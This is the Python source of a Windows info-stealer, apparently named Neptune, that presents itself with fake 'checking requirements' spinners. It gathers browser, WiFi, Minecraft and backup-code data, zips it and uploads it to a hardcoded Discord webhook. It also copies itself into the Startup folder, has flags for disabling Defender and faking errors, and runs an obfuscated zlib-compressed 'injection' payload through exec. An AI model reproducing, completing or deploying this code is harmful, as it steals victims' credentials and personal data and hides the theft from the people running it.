# TO USER GRABBER JUST CHANGE STRING CALLED "YOUR WEBHOOK HERE"
import base64
import json
import os
import platform
import random
import re
import sqlite3
import subprocess
import threading
import uuid
import ctypes
import psutil
import requests
import wmi
import colorama
import sys
import time
from colorama import Fore, Style
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
from shutil import copy2
from sys import argv
from tempfile import gettempdir, mkdtemp
from zipfile import ZIP_DEFLATED, ZipFile

# ///////////////////////////////////////////////////ADD HRERE YOUR WEBHOOK /////////////////////////////
WEBHOOK_HERE = "https://discord.com/api/webhooks/1048481289600249907/n4CsfCuHv4HTF-F9V9DWqTNi6jM6DRwa1Ad3vX_qLdyhFnMfytxuDqG7OpwHsi_ZaxTT"
# ///////////////////////////////////////////////////ADD HRERE YOUR WEBHOOK /////////////////////////////

print(f''' {Style.BRIGHT}{Fore.MAGENTA}
                             ███▄    █ ▓█████  ██▓███  ▄▄▄█████▓ █    ██  ███▄    █ ▓█████ 
                             ██ ▀█   █ ▓█   ▀ ▓██░  ██▒▓  ██▒ ▓▒ ██  ▓██▒ ██ ▀█   █ ▓█   ▀ 
                            ▓██  ▀█ ██▒▒███   ▓██░ ██▓▒▒ ▓██░ ▒░▓██  ▒██░▓██  ▀█ ██▒▒███   
                            ▓██▒  ▐▌██▒▒▓█  ▄ ▒██▄█▓▒ ▒░ ▓██▓ ░ ▓▓█  ░██░▓██▒  ▐▌██▒▒▓█  ▄ 
                            ▒██░   ▓██░░▒████▒▒██▒ ░  ░  ▒██▒ ░ ▒▒█████▓ ▒██░   ▓██░░▒████▒
                            ░ ▒░   ▒ ▒ ░░ ▒░ ░▒▓▒░ ░  ░  ▒ ░░   ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ ░░ ▒░ ░
                            ░ ░░   ░ ▒░ ░ ░  ░░▒ ░         ░    ░░▒░ ░ ░ ░ ░░   ░ ▒░ ░ ░  ░
                               ░   ░ ░    ░   ░░         ░       ░░░ ░ ░    ░   ░ ░    ░   
                                     ░    ░  ░                     ░              ░    ░  ░
                                                               
                                                      github.com/Rdmo1
                                                     {Style.BRIGHT}{Fore.LIGHTBLACK_EX}==================''')

def Spinner():
	l = ['|', '/', '-', '\\']
	for i in l+l+l:
		sys.stdout.write('\r' + Fore.WHITE +'Checking the requirements...'+i)
		sys.stdout.flush()
		time.sleep(0.2)

Spinner()


os.system('cls')

print(f''' {Style.BRIGHT}{Fore.MAGENTA}
                             ███▄    █ ▓█████  ██▓███  ▄▄▄█████▓ █    ██  ███▄    █ ▓█████ 
                             ██ ▀█   █ ▓█   ▀ ▓██░  ██▒▓  ██▒ ▓▒ ██  ▓██▒ ██ ▀█   █ ▓█   ▀ 
                            ▓██  ▀█ ██▒▒███   ▓██░ ██▓▒▒ ▓██░ ▒░▓██  ▒██░▓██  ▀█ ██▒▒███   
                            ▓██▒  ▐▌██▒▒▓█  ▄ ▒██▄█▓▒ ▒░ ▓██▓ ░ ▓▓█  ░██░▓██▒  ▐▌██▒▒▓█  ▄ 
                            ▒██░   ▓██░░▒████▒▒██▒ ░  ░  ▒██▒ ░ ▒▒█████▓ ▒██░   ▓██░░▒████▒
                            ░ ▒░   ▒ ▒ ░░ ▒░ ░▒▓▒░ ░  ░  ▒ ░░   ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ ░░ ▒░ ░
                            ░ ░░   ░ ▒░ ░ ░  ░░▒ ░         ░    ░░▒░ ░ ░ ░ ░░   ░ ▒░ ░ ░  ░
                               ░   ░ ░    ░   ░░         ░       ░░░ ░ ░    ░   ░ ░    ░   
                                     ░    ░  ░                     ░              ░    ░  ░
                                                               
                                                      github.com/Rdmo1
                                                     {Style.BRIGHT}{Fore.LIGHTBLACK_EX}==================''')
input(f'''{Style.BRIGHT}                                          {Fore.WHITE}[>] Please press ENTER to continue [<]

''')

os.system('cls')

print(f''' {Style.BRIGHT}{Fore.MAGENTA}
                             ███▄    █ ▓█████  ██▓███  ▄▄▄█████▓ █    ██  ███▄    █ ▓█████ 
                             ██ ▀█   █ ▓█   ▀ ▓██░  ██▒▓  ██▒ ▓▒ ██  ▓██▒ ██ ▀█   █ ▓█   ▀ 
                            ▓██  ▀█ ██▒▒███   ▓██░ ██▓▒▒ ▓██░ ▒░▓██  ▒██░▓██  ▀█ ██▒▒███   
                            ▓██▒  ▐▌██▒▒▓█  ▄ ▒██▄█▓▒ ▒░ ▓██▓ ░ ▓▓█  ░██░▓██▒  ▐▌██▒▒▓█  ▄ 
                            ▒██░   ▓██░░▒████▒▒██▒ ░  ░  ▒██▒ ░ ▒▒█████▓ ▒██░   ▓██░░▒████▒
                            ░ ▒░   ▒ ▒ ░░ ▒░ ░▒▓▒░ ░  ░  ▒ ░░   ░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒ ░░ ▒░ ░
                            ░ ░░   ░ ▒░ ░ ░  ░░▒ ░         ░    ░░▒░ ░ ░ ░ ░░   ░ ▒░ ░ ░  ░
                               ░   ░ ░    ░   ░░         ░       ░░░ ░ ░    ░   ░ ░    ░   
                                     ░    ░  ░                     ░              ░    ░  ░
                                                               
                                                      github.com/Rdmo1
                                                     {Style.BRIGHT}{Fore.LIGHTBLACK_EX}==================''')

def Spinner():
	l = ['|', '/', '-', '\\']
	for i in l+l+l:
		sys.stdout.write('\r' + Fore.WHITE +'Extracting the requirements, please wait a minute...'+i)
		sys.stdout.flush()
		time.sleep(0.2)

Spinner()



__PING__ = "%ping_enabled%"
__PINGTYPE__ = "here"
__ERROR__ = "%_error_enabled%"
__STARTUP__ = "%_startup_enabled%"
__DEFENDER__ = "%_defender_enabled%"

def main(webhook: str):
    webhook = SyncWebhook.from_url(webhook, session=requests.Session())

    threads = [Browsers, Wifi, Minecraft, BackupCodes]
    configcheck(threads)

    for func in threads:
        process = threading.Thread(target=func, daemon=True)
        process.start()
    for t in threading.enumerate():
        try:
            t.join()
        except RuntimeError:
            continue

    zipup()

    _file = None
    _file = File(f'{localappdata}\\{os.getlogin()}.zip')

    content = ""
    if __PING__:
        if __PINGTYPE__ == "everyone":
            content += "@everyone"
        elif __PINGTYPE__ == "here":
            content += "@here"

    webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/attachments/1038435089807323206/1038451666317488158/dsaf.png?size=4096", username="Purora")

    PcInfo()
    Discord()


def program(webhook: str):
    Debug()

    procs = [main]

    for proc in procs:
        proc(webhook)

def try_extract(func):
    def wrapper(*args, **kwargs):
        try:
            func(*args, **kwargs)
        except Exception:
            pass
    return wrapper


def configcheck(list):
    if not __ERROR__:
        list.remove(fakeerror)
    if not __STARTUP__:
        list.remove(startup)
    if not __DEFENDER__:
        list.remove(disable_defender)

def startup():
    startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
    if os.path.exists(startup_path + argv[0]):
        os.remove(startup_path + argv[0])
        copy2(argv[0], startup_path)
    else:
        copy2(argv[0], startup_path)

def create_temp(_dir: str or os.PathLike = gettempdir()):
    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
    path = os.path.join(_dir, file_name)
    open(path, "x")
    return path

# INJECTION ( obfuscated )


import zlib
import codecs
import base64
exec(codecs.decode(zlib.decompress(bytes(b'x\xda\xd5]mS\xdbH\x12\xfe1\x07\xac\x81\xca\x16\x05I\n\xea\xb8\xa3.N\xb0\xb9\xc0\xa6\x8e\xbb\xf0\xe2\x0f\xcb\xda\xb2d0\x89\x8d,\xd9\x86,\x97\xdf~\xd33#iz\xa6{$\x19\x13r_R\x8e\xb1\xc7\xf3\xd2\xf3\xf4\xd3\xaf\n\xef\xc3\xa0\x11\x8c\xfba\x90\xfc*\xfe\x11/\x1a\xbdn\x12\xbe}\xfdko\xf7\x8d~c\xf2\xcby\xfcz\xed\xcf\xe6\x7f\xcfZ\xff8\x1fm4\x8e\xcfO\x1eN^\x9d\x9f\xcc?|?;=\xde:m\xad\x0e?\xfe\xbd\x1d^]|\xe8\xac\xefu\x9b\xdd\xf9p\xf5M\xfb/\xc3\x87\xaf\xed\xce|/\x12\xff\x1c\xdf\xb7;\x8d\xd3k\xf1\xeaS\xd4z\xff\xef\xdd\xb4\xdd9\xb8\x18\xb4{\x0f\xe3\x07\xf1\xeaX\xfcat\xd8k\xffe\xeb\xf3u\xab\xffz\'\x80\x8fLZ\xc1\xb7\xcd\x8b\xeckz\x80\xd6\xbb?\x8e\xa2\xd6\xbbW;i{w~\x1c\xb6\xd6\xc2\xe3\xb4\xbd\xb75\x9c\xb7\xd6\xe6\x17\xf7\xad\xc6\xe3o\x0f\xed\xdd\xc6\xe7/\xed\xbd\xfd7\x8d\xd6\xda\xfb\x9di\xab\xb1\xdf\xbe\x87\xcf\xdd\xe6\xef\xa5\xad\xe0\x0f\xf1\x1b\xf0\xddV#\xdd\x8e[k;\x8f\x93\xd6\xda\xd9Q\x02\xdf\x9d\xc2(\xe2\xd5\xe8h \xbe\xb1{\x07\xdfH\xc4{\x1f\xd3\xd6\xda\xc9\x1e\xfc\xeei(>\'f%\xc6\x13\xdf=;\x1c\xb4V\xaf\xae\xc60\x8a\xf8kC,kok\xf0\r\xde\x0ba\xd0P\xac\xe8m\x02\xf3{h5\x86\xdf\xc70^_\x0c\x7f\x1c\x89\xa9}\xd8\x10\x836\'\xe2\xbf\x87=1\xab\xad\xb8\x15\xc4\x8d\x10^\x89\t\x85\x9f\xaeam\xd7\xed\xdd\xb3\xb71|\x17f\xd0\x14\xff=~\xbc\x84\x89o\xc0ot\xda\xbbaSLh\xfe)\x81\xcf\xdd\xc1\xac\xc6\xf0\xde\x04\x86\x1a\xb5ww\xf6\xc5_O\xc4\xc8b\xbc\xa1\x9a\xdf\xeeAw*>\xb7=\x86\xf9\r\xe4x0\xc0\x1c\xf6\xa5\xa7\x97\xb0\xff\xe6\x0e\xd6\xf1\x00+\xdf\x80U\xf6\xc5y\xec\xdf\xc1\xabk\xf1\xbb\x07bm\xef\xdf\x06\xb0\x1b\x83Vcew\x03~\xa3\x03\x7f\x95;\x0e+:\x9a\xcb\xcd\x81W\t\xecA\x00\xe3\xcd\xe1srm_\xc4$\xc5\xa0b\x0f\xd6a\x9f\xc5\xfcN\xe0#r\xf6\xcd\xab1\xac\xfc\x0b\xccj\x06\xbf\xdb\x81\xf5\xae\xc2\x7fo`\xbc\xa9X\xea^\x00{*~m\xf8\xe7\x1a\xac(\x84E\x07\xf0\xdd\t\x9c\xe0L\xffF\xe3\xb3\\~\x02s\xee\xc2\x84\xe6\xb0/c\x98\xf3T\x0e\x0f\xff\xa40\x97P\xca\x90\x18\xe0Q\xecKx4P\xbf\xbb\xfe\xf6_\x9br\x95\xb0/7\xb0\x84{xo_\x9d\x02\xec\x86\x18~G\xfen\x1f\xf6\xea\x1e\xc6\xbb\x97\x9b\x08S[\x85=\xbdV\xf2\'\xe6\x97\xc07\x860\x9e|OL\xedl\xa7\x03\xaf\x128\xdf\xa9^\xa09\xde\x86\x96\x17\x18O\xcco\x06\x83\xde\xc1^us\x99\xbc1\xc7\x1b\x1d\x05\xd9z\xaf"=?-/Jva\xbcH\xef\xa9\x9e_\xa4\xcf\x12\xe6\'\xb6)2\xc6\x13\xa70\x84\xbdZ\x87\xf9M\xf4\xfc\x9a\x07\x17\xf0\xe3\xfbZN\xf5\x9e^\xc2\xfc\xe60\xe8X\xc9K\xff\xf5^\x1f\x0e4\x85\xb9ta\xa6r\x80)|8\x16\xef\xedw\xe0\xbf\x03\x90\x97\x04\xf6\xf4\x1e>\x9c\xc8cT\xe3e\xf3\x83\xfbv\x01k;\x0c\x9c\xf9)yy\xbch\xadn6\xce\xcd\xf3\xd8\xd9\x8f\xe5\x8d\x82\xbb\xda\xcf\xe77\x03\x91\x972\x14)\x19\x92s\x11\xf2"wr\xa0eht4\x81\x95\x8f\xb3\xf1\xb6z\xf0\xdd[}\x1e\'{ 4\xa7Q&\x7f\xdfS-H\xf2|\xf5y\xc8\xa1&\xea"\xae\x8dN\x1f\xc4\xfc\xf6Gj\xbd\xe2.\xc8\xcb\x19\xc0x\x9b\x00\x05A>?@\x9f\x8fS\xf1\r\x10\xdbp\xaf\x073H\xf2\xf1nryI\xe1\xce\xace\xf2"\xe6\'\xceh\xa6\xef%\xdcPc\xbc\xe1w\x18\xe0\x13\xe0\xd0^\x98\x9dB\x86ab\xa9}\xf8\xc6,\xdf\xbf(\x9f_\x0c#\xdf\xc9\xf5\xc2N\xf6\xe0<V\x14J\xc9\x15\xc1\xd5\x85\xdf\x9d\xe7\xe3I\\\x93\xbf\x11\xe7\xfb\x17\xe5\xe7\xfbW\xf8n\xa4\xf1\n\xee\xbeo\xff\n\x8c\x953\x00\xfc\xfb}\\\xcc\x0f\x96?\x82\xef\x02n4{\x08\x0f\x00\'%\xae\x9d\xed\xf5\x95\xb4\x0b\xf9\xeb9\xfb\'\xe6\x97\x9f\x87\xc4\xe7/\xb0\x7f\xf2\xee\xeb\xf9e\xeb\r\xf4Yjy\t\xf2\xf1&z\xffN\xf6\xa6 \xcf\x97\xf8|C}<as`\xae\xd78\xdff\x1f\xaf\xb7/\x0f\n\x06\x9d\x81P\x0f(\xf9\xcb>\'\xe4/\x9b_\x97\xb8\x1f\x03<?\xd8\xb0\xed;|\xbe#\xf8\xee\x1d\xac7\xd0\xfb\x9c\xe1\xa9\xc2\x03\xb1\xc5\x13\xd0j\xa1\xd63\xf2w\xc3f\x0c\x8b\xe9\x82<G\xe6\xfcF\xa7\xf7\x12\x0f$\xf2\xab\xf1\x0cy9\x11\xa2\x17|;\xe8)YS\x1a\xb6q\xf15\xc7\xe7H\xdeKj~\x1aO\xf5}3\xf1E\xc8U\x9a\x9f\xaf\x9e\x9f\xc2\x03\x89\x7fB\x9e\xf1\xf9~\x83\xdf\x88\xe4z%\xac\x13\xf7\xa3\x9f\x9d[v\xdf4\xfe\xbd\x1bK}n\x8e7:\xbd\x85\xcd\x1e\xe9\xfb\xb6\t\x08W\x8c\'aD\xee\x0b\xf0\r\xb1\xde)\x1a\xcf\xc0\xd3\x81s?\x04\x1e\x00\x86\xf5\xd4z5?\x10:\x14\xf8\x90V\xear7\x80\x1fH\xc2\x022$\xef\x07\x96\xbf\xec\xfe\n\xfd\x91\xe3):\x8f\xcd\xab\x18\xcb\xcb\x8d\xd6\xe7\xe9v\x03\xdf7k\xffB}\xcf\x89\xf5:\xe3}\x82\xcfuA\x86\x0e&x<\xb9\x7fZ\xb5\x99\xfbg\xc8_\x0c\x9a\xfd\xc1\xd8?\xc5_\x80\xec\x88\xbfNi|\x16\x12a\xdd_\xc5\xc32y\xb9\xe6\xee\x87\x85\xf7\x0f\xf0j\xa0\xef\xaf\xc6\x17\xeb<.\xe1~$\xe6\xfc\x00\xc3\x82x\xf3<\xe3\x7f\xc6xS\xa9\x0c\xf1\xf9"\xfc\x1b\x1d\xe9m2\xc6\xd3x57\xf5\xb9\xbeo7\xb06\xa9\x1c,<\xd0\xf8\xac\xf6\xd9\xba\xbf\x9a\xafm\xc2\x0c\x06\xf6\xfc\xe4_\x81\xe5\xe6\xfc@\x8e\xd7\xd7\xfc\x05\xe6\x07ZR\xebsS\xfeb8\x8f\xc4\xd0G%x\xa0\xf5\xc7\x86s\x1eZ_\xce%\xcb \xf0Y\x08\xffA\xdf\xbaoi\xc1c\xf3\xfb\xab\xef\x87\xe4\xfc\x8d\xf4\xcd\x88\xc0g\x03\xff\x90\xbeT\xf2\'\xf8\xd5\xca\x9bq~\xdf,\xfd&\xf9Z\xc2\xe3\xb3\x81\xa7\x8f\x1f\'\xea\x1a\x88W\x89\xdc{\xf3|5\xde\x0fa\xbc\x117\xbf\xd0\xe4\x1b0\x8a\xd2\x1fg\xe2s\x0c\xbelJ\x1e\xcb\xae\x17\x9fG\xa1\xdf\n}\xd9\xd5\xf6\x82\xd4[\xc4z\xc5o\xbc\x82\xef*\x04\xc6\xe3I\xdd\xd8m\x05W\x8f\xdd|~\x89\xde?}\x7f\x87\xda\xde*\xe4E\xdf\xb7\xb1\x9a\x9f\x81/\xc5z\xe1\xce\x88\xdfm\x10\xf7W\xea\xdf\x0e\xd6\x1f_aVS=\x9e\x89\x07H\xfe\xf4\xfd\xc8\xf8\x01P?\xad\x8f\x9a\x81\xbb\xde\x9d\xae\xe2\x93`\xcfp\xf7c\xaa\xf9\xa4-\x7fW\x97X\x9e\r\xfc\xc3\xf7\xd7\x1c\x0f(\x89\xab\x8f\xd4\xf9\x0e\xf0\xfeI\x966\xd0\xfa\xd2\xe4WS=^\xe3\xf3\xcc\xe6\x7f\x99=\xf37\x98\xf3=\xbe\xbf9\xbed\xfa\xd7\x90\x17\x89W\'\x82yd\xfc\x9e\xda\xbf\xbe\x87_i{\xc6\xc1?q\x1e\x03\x8e\xefN=xj\xac\xd7\xbc\xbf\xf0\x915\xc4\xaf\x14\xfe\xad\x83R\x9a!\xfd\xfb\x9f\t\xcc/P\x96\xab\xc1\x0f\xcc\xfb\x9b\xe6\xfb\x97\x9d\x87\xb6WC\xa9\x17<\xfa\x08\xe4\xd9\xde?\x8dW&\xbe`\xfe\x82\xc7\xfb*-\x1b\xc5\xc7\x11\x7f\xc9\xf6\xcf\xe4\xa7\xdd\x12\xf9\x03\xfbW\x1aX\xf2\xcc1\xbf\xcf\xe5\x0f\x9c\x12&\xdf\xb5\xf4\xd1\x80\xc5\x03l\xcflh|\x1e\x81\x81\xda\xbc\xaa\xc0\x0fh|\xb6\xf0\x05\xd9\x97\x84\xfc\x1d]\xd3\xfaC\xe8s<\x1e\xba\xbf\xda>\x1fp\xfa\xd7\xe2C\xa1\xd4G\x06?Urp"\x8eB\xda[\x19\x1f\n\x11\xfe\x9d\x06\xdag\xc4\xf2\rd\x1f\xe5\xfa\xadc\xf3\x83L^\xc6\xb9\xff`@\xd9o\xd6\xfd\xcd\xfcRb\xff2~\x95\xb8\xf3\xdb\xefz\xf8_E\xbc\xca\xf4\x9b4\xd8RW\x9e\xb7&\xb9?,$\xec\xa3 \xd7\x97\x89c_\x8a\xf1J\xf8\x06\x83\x7f\xd3|<\x03\xff\xe4\xee\xe2\xfdC\xfa\xa3\xe0kU\xed\xb7\x13\xf0\xfb0\xfc\x00\xdb\xe7\x85\xfd;\xc9\xf1\xc0\xc5\xfb\x93\x9d\xb0\x0e\xfe)\xfe\x9c\xfb7\x12\x1b\xffL\x7f\x13\xc3\xff\x8c\xf5*\x7f\xce[\xcb\xbfa\xc9_\x8a\xefoa\xff\x16x\x9f\xf1g\xf0\xe5\x8amO\xb1\xfc\xd9\xfa\xc8\xe3?0\xf5\x87\xb6\xdf\xe0s\x0e\x1e\x18\xf6\xc2vl\xf8\x0f\x840H)\x99\x19\xfe5\x17\xff\x02\xef\xfd\ry~`\xf0S\x87\xff5\x08\xfd{/\xfd\xd9\xf8<\n\xfd\xd1\xc7|\xbc\xa7\xa0Y\xea7\xb1\x7f_\x91\xbfd7V\x1e\xb9\xc6\xfe\xbb\t\xbd\x7fR^(\x7f\t\xe0\x8b\xc5\xef\xf7\xb6\xfar\xc7\xa7\x04>\x1b\xfe+\xccw\xe5\xa9\xc2z\xdb\x13\xce\xfeX\xcf\xcfM\xe9_X\xb4\x04\x8fP\xf3\rS_"\xbef\xdc7\xdb\x7f0\xa0\xf8\x9f\xb6\x8f`\xbd\x0c_\x9b\x98\xf6\x82\xb1^\x93O\x9a\xf2"\xef\x07\x9c\xaf;^?\xd7\x97\x1d\xc7\xbf\x86\xf1\xd4\xd4\xbf\xa7\xae}n\xdaG\x11#\xcf\xbb):_\x83\xbfL\xf1\xfd-\xce#\x06\xdb~\x8d\xf0\x1f\xc4\x0e\xbf\xc2xj\xf3?\xc9\xbd!n\x90\xdd\xb7N~\x1eR\xb9\xf6\xb5\x9f\xd5\x95\xe7:\xf8\xe7\xb7\xcf\x0b>\x94b\xfbm\x05\xd6{\xab\xe2GbBCN\xfe\x1c\xfcSx\x9a\xfb\'\xf3\xfb\xa6\xfc\xed\xe2\nM\xe1<b\xd6\xffB\xec_l\xea-\xd7\x9f\x033\x9d1\xfco\x7f\xc4\xfa\xc30\x1eX\xfe\xc9\x18\xd9\x97\xca\x9f\xb3\x91\xeb\x0fB^\x8e9\xfd\x06\xfeg\x8f~\x1bp\xfc\x85\xf5\x9f\xf6\xb1\xbd\x8a\xfc\xe3\xc2>\xaf\xc7\xff\x84}\xd9\x81\r\xdb0\xf4\x9b\xb1\x7f\x9a_E\xe5\xfe\x83D\x8d\x07h\x96\xf3\x03\x8a_\xa5\xac\xff\x1e\xdb\xe7\xd9}K \xdaG\xe9K\xda^`\xf9\x9f9?\xdb\x1eD\xfc\xaf\xc4\x7f\xe5\xdao=\xdb>W|c\xffCC\x0c\xf0\xb9\xf0wN\x94\xd4\x89\x01\xa6\xca\xfe\x90\x9a\xc9\x87\x7f\x84\xff \xf3O\x12\xf6\x16\xe7\x1f\x0f\x14N\x16\xf8\x87\xfc\xb1\xfdJ\xf8\xe7\xb7\x7f3}\x99\xdb\xd3\xc5\xf9\xeah\x95\xfa\xabc\xff\xa6\n\xcd,\xf93\xf1\xe5\xf7\xbb\x12\xff\x10u\x1e\x0e\x7fV\xf7w\x15f\xca\xf8we\xfc\x83\xd2\x97\x92o@\x9c\xd8\x96\xe7\xa6\nM\xdf2|\x12\xce\xa3\xe0\x07\x8e\xfd;\xc5\xfe{\x03\xefK\xeeo]\xfc\x8b8\xff\xbd\x85/\x96\xfc\x15\xfe\xf1B\xfe\xa6\x80WQ]~\xa0\xec\xdf\x11a\x0f&\x84\xfe\xf8\xa6\xa3\xf09\x7fa\xf8\x15\xda\xbf\xb3\x9d\xae\x92!q\xf01\x1f\x9f)\xf8\xb3\x1b\xffHM\x7f\x93\xc3_\x18{\xa1\xf9\xe8\xc7\xbf\xd4\xd5oY\xbc\x82\xb4\x7f\x91~S\xf6o\xe6\xff\x8b\xcd\xf3\xa5\xf1\xc5\x8d\xa7\x98\xfc\xc5\x92\xbf\x81\x89\x07\x8e\xfd\xe1\xd1\xbf\xb6>2\xf9\x86\xab\xdf\x8e\x1f\xbb<\xbf\xc7\xfe\x17\xec\x7f\x8e\r{\xa6\x12\xff\xfbt\xabY\x86\xb3\x7f\x1dG\x9f{\xe2\x1f\x8c\xff\xb4\x92\xffOJ\xec\xad\xc7\x7fe\xdaG\x96\xfe\x88\x10\xbf\xaad\xff.\x16\xbf\x1cS\xf6\xb9\xbe\xbf&\x7fQ\xfaW\xe7\xfbx\xec\x8f\x94\xb2?4\xbe\x98xP\xe0i\x9a\xc7{\x12\xca~#\xf0e\xa6\xf9\x10\xd2\xbf:\x1e\xa5\xf5G\xca\xc4/\xbd\xf8G\xe1\x8b\x13\x9f\xb6\xf9\x1f\x17\x9f\xc6\xf64\x8a\xbfe\xfa\x8d\x92\xbf9>\xdfYn\x9f\x07V|\xa6R~\x84\xe6\x7f\x94\xfc\x15\xf1\x94\x1a\xf1_\xc1\xffL\xfe\x82\xec}\xaf\xff\x14\xe1\xbd^\xef\xd4\xb0Wk\xe0_\xc7\xeb\x8f\xb8+\xf7\xdf;\xfa\xd2\xb5\xb7\x0c\xfb\x97\x88\xa70\xfc\xcf\xb4\x17B6\xff\x80\xde?O|pq\xfeW\xd5\x9fh\xca\xdfl\t\xf8\xb70\xffS\xf1\x0f\xcf\xfe-\x82\x7f=\'\xff\xc0\xe4k7x\xbc\x9co\x9cZ\xfe+\xe9\x1f\x922\x9eb\x7fD5\xfb\xd7\xe2\x7fx\xff de\xf87\x0c\x7f\xd3\xe3o\xdf\x08\x7f,\xa5\x7f-~\x15s\xfe\xbf9\x93\x1f\x01\xf3\x93\xb1@k\xff\x80\xab0\xfe\xd3\xf5<~Y\xcb\xff\xe7\xc6?<\xf7\x97\xe5\x7f\x88_Y\xf6\xaf\xd6o2\xbfi\xc4\xc7k\x17\xe2\x7f\x17\x9e\xfc\x12\x93\xff\x19\xf8\x87\xf1\xca\xaf\x7fK\xed_\xedo\xda \xfc\xf7T<y\xa6\xfd\x7f\x8e\x7f2\x91\xb9\xa1\xb9<\x8f8\xff_PQ\xfe,\xfe\x12sx?1\xe5\x05\xd9\xbfV\xfc\x12\xc7g""\xfe1\xc4\xfc\xb9\xc0\x17H\x19>\x8d,\xfb\x08\xf3\xe7\x94\xb4/\xb3\xf8\xe5\r\x8d/\xc5\xfc\x9c\xf3\x981\xfe\xab<\xbf\x93\xf2\xe7\x98\xf9H\x1a\xd6\x91\xff>\xf5\xfaO\xfd\xf9u\xa5\xf8g\xfa7\xa2\xdc^\xb8\xd7\xf9\xb6\xa3\xa3k\xca\xde\x87\xa1:v~\x0e\xc2\xd3a\xe1? \xf9\x9f/\xdf\x87\xb0\x8f\xec\xfb+\xed\xf3\xb1\xa1\xcf\x19\xbc2\xfd\xc5\x95\xf1\x0f\xf1?\x83_e\xf8\xdc#\xe2G\x9c\xfdk\xfb\x13\x17\xb1\x7f\xcd\xfc\xd3#\x9f}\x89\xedA\x94\x8ft\xbdd\xfbw\x01\xfc\xab\xc8\xffj\xf8\xff\xb0\xff\xde\xd5\xe7Qy\xfc\xa3\'\xf9\xb8\x96g\x9d\x0fl\xf1\x17\x88@\x1fs\xf9a\\\xfe\x86\x93\x7fP\xd8\xab\x89\xdcI\x8e\xbfD\x9c\x7f\xe3\xd2\xcc\xa7v\xf8\x9f\x95\x7fZ\xe0_?\xb7\x7f\xad\xfc\x8d;loQ\xfcE\x9f\xaf\xccG\x17\xdfmh}n\xe6\xd7U\xcd\x7f\x99\xb3\xf9/\xe6\xfc\xcc|\x86(\xb7g\xa2\xe7\xc1?>\xff\xcf\x8a\x0fR\xf9p\xe0o\xb7\xf4\xd1\x02\xfe?z\xff\\\xfb\xdc\xc9\x97G\xfa\x83\xc8?p\xed\xdf\x17\xc3?.\xff\xd9\xcd?-\xc5?*\xbf\x93\x88\xafv\x9c\xfb{\xb2s\xbdd\xfeW\xcb\xff\x17\xe4\xf9\\\x1b\xde\xfc\xd3\xa8\xb6\xfd\xbb\xc6\xc9s\xe8\xb1\x8f\xac|\x81\x17\xb0\x7f\x8f\x1f\xbb\xf8|\x0b\xff_\x84\xf3K\xaa\xe2\x1fo\xff\xeaZ\n:\xde=q\xf3\x0f>\xcd\x89|\x106\x7f\xb2*\xffK\x9e\x10?b\xf5\xef\xcd\x93\xe2\x1f8\xdf\x91\x8b\xf7\xcc\xbd\xfe\xf6\t\x87\x7f>\xfe\xc7\xe5O\x9a\xf6\xaf\x1d\xff\xb8.\xcfG\x9a\xeb\xbcH\xc8\xda\xc8\xfckkl\xfc\x97\xf0w\xcep>\xba\xc5\xaf6\xccz+\'\xfe\x11z\xf8\x9a\xb1\x7f\x95\xf1/a\xf3Ux\x7f\x0e\xe2CV\xfen\xd7\xa3\xdf\xac\xfc\x97\n\xf1\xdf\xcd\xc6EI>f\x85\xf8\xef2\xf0\xcfo\xff2\xf1K:\xbf\xdd\x9f\xff\xc7\xc7?\xe8\xfc\x12\xe9\xcf\xa6\xf9\xb8\xb2/k\xdb\xbf\x8b\xe1_\xa6/\xc9\xfcq\x9c\x9fm\xc6\xcf\xdfv)\xff\x01a\x7fX\xfce\xe0\xc4+L\x7f\xce\x80\xe4\x07\x85?\xd6\xd0\xbf M\x88\xafQ|\xc8\xf27\xad\xc3\x8e\xf7p\xfe\x10\x1b\xff\xb0\xf3\xff<\xf5\x01V~{^\xdf\xe3\xac\xb7b\xfc\x83\xcd\x1f7\xea\xb7l\xfb\x8d\xb2?R]?h\xca\x9f\'\xfeV+\xfe\xe1\xd3G\xe5\xf5V\x15\xfc\xcf\xf5\xfc\x7fT\xbdP\xc6O\x95l\x1c\x06\xc8~\xd3\xf1\xdf\xac^\x88\xd6\x97\x8b\xe3_\x96?D\xf1g\xcc_<\xf6\xaf\xcc\xa7\x96\xf5~WWAm\xfc\xab\x14\xff-\x95\xbfe\xfb\xff(\xff\x0b\x15ON\xb8\xfb\xdb/\xe7\x7f\xc9\xb2\xf2\xff\xcc|e+>3\xe6\xe2\xc97\xd8^}N\xff\x9fS_Q-\xfeQ\x8d\xff\x95\xe7\xff\xe5\xf9\xe3f=6U\x7f\x99,)\xfea\xd7c\x9b\xfe\xddiE\xfb\x97\x8d\x7f\xf8\xf1\xaf\xb4\xfe\x8d\x88\xff\xe2\xfaU\xec?u\xf2-j\xe2\x1f\x8a\xff\xd6\xc8\x7f\x9e\xa2\xf8tQ\xffq\x15,\x95\xff\t<\xa5\xed_\xa7\xfe\x9c\xe2\x7fI\xd6S\xe2\x10\x12\xcb?H\x0fZ\xca\xe7?W\xf5\xff\xa1\xfdK<\xf9\x89\x86?\xacr\xfe_Z\xb1\xfe7\xc3\xbf\xb9\n<\x8c*\xc5?0\xfe1\xf5)\x15\xf8\x9fm\x1f)\xe0\xe6\xebC-\xfcs\xea?\x06e\xf8W5\xfe{\xfc\xd8#\xfc\x93T\xfc\xd7\xca\xbf\x9f\x95\xf4? 